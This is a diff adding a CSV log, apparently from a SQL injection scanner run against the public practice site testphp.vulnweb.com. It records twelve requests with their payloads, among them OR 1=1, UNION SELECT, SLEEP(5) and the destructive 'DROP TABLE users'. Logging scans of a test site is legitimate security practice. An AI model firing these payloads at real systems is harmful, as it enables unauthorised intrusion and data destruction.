@@ -1,0 +1,13 @@
+ID,Number,IP,Site,URL,Payload,Type,Status,Time
+18,12,127.0.0.1,http://testphp.vulnweb.com,/?id=1' SLEEP(5) --...,id=1' SLEEP(5) --,TIME-BASED,200,2025-12-23T05:35:31.018
+17,11,127.0.0.1,http://testphp.vulnweb.com,/?id=1 OR '1'='1...,id=1 OR '1'='1,🔴 BOOLEAN,200,2025-12-23T05:35:30.408
+16,10,127.0.0.1,http://testphp.vulnweb.com,/?admin' --...,admin' --,🟢 COMMENT,200,2025-12-23T05:35:29.787
+15,9,127.0.0.1,http://testphp.vulnweb.com,/?id=1; DROP TABLE users --...,id=1; DROP TABLE users --,DESTRUCTIVE,200,2025-12-23T05:35:29.198
+14,8,127.0.0.1,http://testphp.vulnweb.com,/?id=1 UNION SELECT 1,2,3 --...,id=1 UNION SELECT 1,2,3 --,🟡 UNION,200,2025-12-23T05:35:28.656
+13,7,127.0.0.1,http://testphp.vulnweb.com,/?id=1' OR 1=1 --...,id=1' OR 1=1 --,🔴 BOOLEAN,200,2025-12-23T05:35:28.048
+12,6,127.0.0.1,http://testphp.vulnweb.com/,/?id=1' SLEEP(5) --...,id=1' SLEEP(5) --,TIME-BASED,200,2025-12-23T05:25:23.060
+11,5,127.0.0.1,http://testphp.vulnweb.com/,/?id=1 OR '1'='1...,id=1 OR '1'='1,🔴 BOOLEAN,200,2025-12-23T05:25:22.545
+10,4,127.0.0.1,http://testphp.vulnweb.com/,/?admin' --...,admin' --,🟢 COMMENT,200,2025-12-23T05:25:22.032
+9,3,127.0.0.1,http://testphp.vulnweb.com/,/?id=1; DROP TABLE users --...,id=1; DROP TABLE users --,DESTRUCTIVE,200,2025-12-23T05:25:21.419
+8,2,127.0.0.1,http://testphp.vulnweb.com/,/?id=1 UNION SELECT 1,2,3 --...,id=1 UNION SELECT 1,2,3 --,🟡 UNION,200,2025-12-23T05:25:20.810
+7,1,127.0.0.1,http://testphp.vulnweb.com/,/?id=1' OR 1=1 --...,id=1' OR 1=1 --,🔴 BOOLEAN,200,2025-12-23T05:25:18.954
